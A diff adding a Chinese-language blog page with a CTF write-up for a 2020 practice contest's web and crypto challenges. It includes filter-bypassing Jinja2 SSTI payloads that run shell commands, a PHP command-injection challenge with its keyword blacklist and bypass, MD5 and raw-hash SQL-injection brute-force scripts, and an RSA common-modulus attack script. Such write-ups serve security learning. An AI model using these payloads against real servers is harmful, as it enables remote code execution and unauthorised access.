@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.2">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.2">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.2">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.2" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.2">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.4.2',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Copy',
+      copy_success: 'Copied',
+      copy_failure: 'Copy failed'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="Webweb1考flask，ssti，加&#x2F;2后有会显2，测试过滤了下划线，点，当时没有做出来。这里给出网上收集的一些payload，记录一下。具体可以看这里 传送门12&amp;#123;&amp;#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fmro\x5f\x5f&quot;][1][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[30][&quot;\x5f\x5finit\">
+<meta name="keywords" content="web,crypto">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020安恒二月抗疫练习赛web-crypto writeup">
+<meta property="og:url" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2020&#x2F;02&#x2F;25&#x2F;2020%E5%AE%89%E6%81%92%E4%BA%8C%E6%9C%88%E6%8A%97%E7%96%AB%E7%BB%83%E4%B9%A0%E8%B5%9B&#x2F;index.html">
+<meta property="og:site_name" content="LiM&#39;s blog">
+<meta property="og:description" content="Webweb1考flask，ssti，加&#x2F;2后有会显2，测试过滤了下划线，点，当时没有做出来。这里给出网上收集的一些payload，记录一下。具体可以看这里 传送门12&amp;#123;&amp;#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fmro\x5f\x5f&quot;][1][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[30][&quot;\x5f\x5finit\">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2020-02-27T03:55:47.757Z">
+<meta name="twitter:card" content="summary">
+  <link rel="canonical" href="https://li1m.github.io/2020/02/25/2020%E5%AE%89%E6%81%92%E4%BA%8C%E6%9C%88%E6%8A%97%E7%96%AB%E7%BB%83%E4%B9%A0%E8%B5%9B/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>2020安恒二月抗疫练习赛web-crypto writeup | LiM's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">LiM's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+        
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-friends">
+      
+    
+
+    <a href="/friends/" rel="section"><i class="fa fa-fw fa-paw"></i>friends</a>
+
+  </li>
+      
+    
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger">
+          <i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Searching..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://Li1M.github.io/2020/02/25/2020%E5%AE%89%E6%81%92%E4%BA%8C%E6%9C%88%E6%8A%97%E7%96%AB%E7%BB%83%E4%B9%A0%E8%B5%9B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="LiM">
+      <meta itemprop="description" content="念念不忘，必有回响">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LiM's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            2020安恒二月抗疫练习赛web-crypto writeup
+            
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              
+                
+              
+
+              <time title="Created: 2020-02-25 10:52:08" itemprop="dateCreated datePublished" datetime="2020-02-25T10:52:08+08:00">2020-02-25</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-02-27 11:55:47" itemprop="dateModified" datetime="2020-02-27T11:55:47+08:00">2020-02-27</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              
+              <span>6k</span>
+            </span>
+          
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              
+              <span>5 mins.</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Web</p><p>web1<br>考flask，ssti，加/2后有会显2，测试过滤了下划线，点，当时没有做出来。这里给出网上收集的一些payload，记录一下。具体可以看这里 <a href="https://github.com/w181496/Web-CTF-Cheatsheet#flaskjinja2" target="_blank" rel="noopener">传送门</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">""</span>[<span class="string">"\x5f\x5fclass\x5f\x5f"</span>][<span class="string">"\x5f\x5fmro\x5f\x5f"</span>][<span class="number">1</span>][<span class="string">"\x5f\x5fsubclasses\x5f\x5f"</span>]()[<span class="number">30</span>][<span class="string">"\x5f\x5finit\x5f\x5f"</span>][<span class="string">"\x5f\x5fglobals\x5f\x5f"</span>][<span class="string">"\x5f\x5fbuiltins\x5f\x5f"</span>][<span class="string">'\x5f\x5fimport\x5f\x5f'</span>](<span class="string">'os'</span>)[<span class="string">"popen"</span>](<span class="string">'cat /flag*'</span>)[<span class="string">'read'</span>]()&#125;&#125;	//	\x5f是_</span><br><span class="line">&#123;&#123;()|attr(request['args']['x1'])|attr(request['args']['x2'])|attr(request['args']['x3'])()|attr(request['args']['x4'])(233)|attr(request['args']['x5'])|attr(request['args']['x6'])|attr(request['args']['x4'])(request['args']['x7'])|attr(request['args']['x4'])(request['args']['x8'])(request['args']['x9'])&#125;&#125;?x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__("os").popen('cat /flag').read()</span><br></pre></td></tr></table></figure><a id="more"></a>
+
+
+
+<p>web2<br>是md5的一些绕过，昨天下午在上课，忘记复制源码，这题和2019掘安杯web7差不多，源码差不多是这样</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">$str1 = @$_GET[<span class="string">'str1'</span>];</span><br><span class="line">$str2 = @$_GET[<span class="string">'str2'</span>];</span><br><span class="line">$str3 = @$_GET[<span class="string">'str3'</span>];</span><br><span class="line">$str4 = @$_GET[<span class="string">'str4'</span>];</span><br><span class="line">$str5 = (string)@$_POST[<span class="string">'str5'</span>];</span><br><span class="line">$str6 = (string)@$_POST[<span class="string">'str6'</span>];</span><br><span class="line">$str7 = (string)@$_POST[<span class="string">'str7'</span>];</span><br><span class="line"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'str1 OR Sstr2 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'str3 OR str4 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'str5 OR str6 OR str7 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!($_POST[<span class="string">'a'</span>]) <span class="keyword">and</span> !($_POST[<span class="string">'b'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"come on!"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$a = $_POST[<span class="string">'a'</span>];</span><br><span class="line">$b = $_POST[<span class="string">'b'</span>];</span><br><span class="line">$m = $_GET[<span class="string">'m'</span>];</span><br><span class="line">$n = $_GET[<span class="string">'n'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(ctype_alnum($a)) || (strlen($a) &gt; <span class="number">5</span>) || !(ctype_alnum($b)) || (strlen($b) &gt; <span class="number">6</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"a OR b fail!"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((strlen($m) &gt; <span class="number">1</span>) || (strlen($n) &gt; <span class="number">1</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"m OR n fail"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$val8 = md5($a);</span><br><span class="line">$val9 = strtr(md5($b), $m, $n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;val8 : $val8&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;val9 : $val9&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">if</span> (($val8 == $val9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === <span class="number">5</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"nice,good job,give you flag:"</span>;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'./flag.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>str1,str2,str3,str4都可以用数组绕过，str5，str6，str7是转换类型的强判断，网上有很多类似的文章解决方法，可以看这篇文章 <a href="https://xz.aliyun.com/t/3161#toc-5" target="_blank" rel="noopener">传送门</a>，这样就可以构造出str5，str6，str7。后面这一段很明显是要用0e的比较方法，限制条件是a必须是字母或数字且a的长度不大于5，b必须为字母或数字且b的长度为5，md5($b)可以改变1个字符，脚本如下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">dic = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(key)</span>:</span></span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(key.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> dic:</span><br><span class="line">                    f=a + b + c + d + e</span><br><span class="line">                    T = md5(f)</span><br><span class="line">                    <span class="keyword">if</span>((T)[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">'0e'</span> <span class="keyword">and</span> (T)[<span class="number">3</span>:].isdigit()):</span><br><span class="line">                        print(f)</span><br><span class="line">                        brea</span><br><span class="line">//改变一个字符可以随便放宽一个字符的要求即可</span><br></pre></td></tr></table></figure>
+
+<p>web3<br>命令执行，这道我没看到就已经没了，被别人删题了，看了一下别人发的源码，很简单，很多方法绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h3&gt;This is the command practice&lt;/h3&gt;  </span><br><span class="line">&lt;form action=<span class="string">"index.php"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input value=<span class="string">""</span> name=<span class="string">'cmd'</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd=$_POST[<span class="string">'cmd'</span>];</span><br><span class="line">$blacklist=<span class="string">"cat|\/|cd|flag|curl|&#123;|\(|'|\"|echo|\\\\|&amp;|grep|base64"</span>;</span><br><span class="line">$arr=explode(<span class="string">'|'</span>,$blacklist);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">	<span class="comment">#var_dump($value);</span></span><br><span class="line">	<span class="keyword">if</span> (preg_match(<span class="string">"/$value/i"</span>, $cmd)) &#123;</span><br><span class="line">	<span class="keyword">exit</span>(<span class="string">'hacker~~~'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">system($cmd);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>直接cmd=more *就可以了。</p>
+<p>web4<br>代码如下，构造注入，<a href="https://www.blue-lotus.net/codegate2013-web100-writeup/" target="_blank" rel="noopener">原题来自</a>，hash(“whirlpool”,$ps, true);true表示是用原始二进制格式的字符串，所以这里存在注入，若原始二进制格式的字符串含有’=’就可以返回true，登录成功。写题时只想到了’or’，没有找到答案，但是用’=’很快就找到了答案，爆破php脚本如下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ps = mysql_real_escape_string($ps);</span><br><span class="line">$ps = hash(&quot;whirlpool&quot;,$ps, true);</span><br><span class="line">$result = mysql_query(&quot;select * from users where user_id=&apos;$id&apos; and user_ps=&apos;$ps&apos;&quot;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pass=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">1</span>; $i&lt;=<span class="number">1000000</span>; $i++) &#123;</span><br><span class="line">    $pass++;</span><br><span class="line">    $pw = hash(<span class="string">"whirlpool"</span>, $pass, <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (strpos($pw, <span class="string">'\'=\''</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        var_dump($pass);</span><br><span class="line">        var_dump($pw);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>Crypto</p>
+<p>crypto1<br>考古典密码，凯撒密码，摩斯密码，栅栏密码</p>
+<p>crypto2<br>考rsa，共模攻击，脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">21550279102644053137401794357450944302610731390301294678793250727396089358072700658571260795910112265309568014296122288384516447895827201111531054386530016432904989927216701507587366446802666848322853781729905492728655474832512381505627940555854308364578108265962388044363133246414753768229564846275154311898383993892293297122428661960946207950994560898964054913194462187242818633295970027741085201122155726130759045957757833942616544066055081600792366411691979350744894938994915328874600229684477533220240489600171746943849179803693122081888324258987779131223150589953248929679931142134208151043000793272520874205933</span></span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line">e2 = <span class="number">11187289</span></span><br><span class="line">c1 = <span class="number">3398498381912395819190972489172462865619978412426461006637853132394421358554444085509204376417687407497725837275868696481008111895766215578504776574832032556271718345687763315140723387608016365200919607751172500433727679269003098314988424638473027123820847847826679169000817669427223462669128173658466684135284118199815059085013479646863344355311315928713888347485004116168388822942797985291207722712351376891776564431593839662958249777540851019964959285093222467104765037231393043482615879794268339523066822738215251088897330388858109680412562153811860413533184870172160079371279534423386236128033224501238509297353</span></span><br><span class="line">c2 = <span class="number">3466733921305804638105947202761163747472618602445995245253771384553216569474005211746398256742813639292824489920799418551206486872148557599625985549276697777903434273072767901043963396047653458242735767809413051298636887840641872939342025101757793615068691040228073377366562557622977332819376942596081135968249279010542277871138668977160241877260538203101507006391433015105607006204397243716334344883925947719719479074061998068934050946968531874465924912747079003982022188875112147185558223515367430238618463189740762128953957802291125793882636020335117593003197811477506533564676975831899876919568948425610130348710</span></span><br><span class="line">gcd, s, t = gmpy2.gcdext(e1, e2)</span><br><span class="line"><span class="keyword">if</span> s &lt; <span class="number">0</span>:</span><br><span class="line">    s = -s</span><br><span class="line">    c1 = gmpy2.invert(c1, n)</span><br><span class="line"><span class="keyword">if</span> t &lt; <span class="number">0</span>:</span><br><span class="line">    t = -t</span><br><span class="line">    c2 = gmpy2.invert(c2, n)</span><br><span class="line">m = gmpy2.powmod(c1, s, n) * gmpy2.powmod(c2, t, n) % n</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i># web</a>
+            
+              <a href="/tags/crypto/" rel="tag"><i class="fa fa-tag"></i># crypto</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/02/08/BJDCTF2020%E9%83%A8%E5%88%86wp/" rel="next" title="BJDCTF2020部分wp">
+                  <i class="fa fa-chevron-left"></i> BJDCTF2020部分wp
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">LiM</p>
+  <div class="site-description" itemprop="description">念念不忘，必有回响</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">tags</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">LiM</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    
+    <span title="Symbols count total">82k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    
+    <span title="Reading time total">1:14</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.0.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">
+      
+    Theme – <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.4.2
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
